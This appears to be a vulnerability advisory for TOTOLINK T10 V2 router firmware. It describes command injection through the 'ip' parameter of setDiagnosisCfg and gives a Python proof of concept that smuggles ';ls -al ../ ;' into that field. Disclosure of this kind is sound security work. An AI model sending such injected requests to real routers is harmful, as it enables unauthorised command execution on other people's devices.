## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://totolink.com.my/products/t10/

## Affected version

T10 V2_Firmware V2_V4.1.8cu.5207

## Vulnerability details

In the T10 V2_Firmware V2_V4.1.8cu.5207 firmware has a command injection vulnerability in the `setDiagnosisCfg` function. The `Var` variable receives the `ip` parameter from a POST request. However, since the user can control the input of `ip`, the `system` can cause a command injection vulnerability.

![image-20240902181559657](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240902181559657.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"ip":";ls -al ../ ;","topicurl":"setDiagnosisCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721213628055](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213628055.png)
